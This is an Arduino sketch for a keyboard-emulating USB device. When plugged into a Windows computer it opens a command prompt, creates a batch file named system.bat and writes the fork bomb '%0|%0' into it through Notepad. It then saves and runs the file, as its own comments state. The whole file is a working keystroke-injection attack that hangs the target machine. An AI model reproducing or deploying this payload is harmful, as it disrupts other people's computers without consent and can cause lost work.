#include<Keyboard.h>
void setup() {
pinMode(13,OUTPUT);
Keyboard.begin();
Keyboard.releaseAll();
delay(2000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(100);
Keyboard.print("cmd");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(100);
Keyboard.print("copy nul>system.bat");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.print("notepad.exe system.bat");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(500);
Keyboard.print("%0|%0"); // inserting fork bomb code to batch file
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press('s');
Keyboard.releaseAll();
delay(100);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(KEY_F4);
Keyboard.releaseAll();
delay(100); 
Keyboard.print("system.bat"); // deploy fork bomb on windows 
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
digitalWrite(13,HIGH);

}

void loop() {
  // nothing here

}
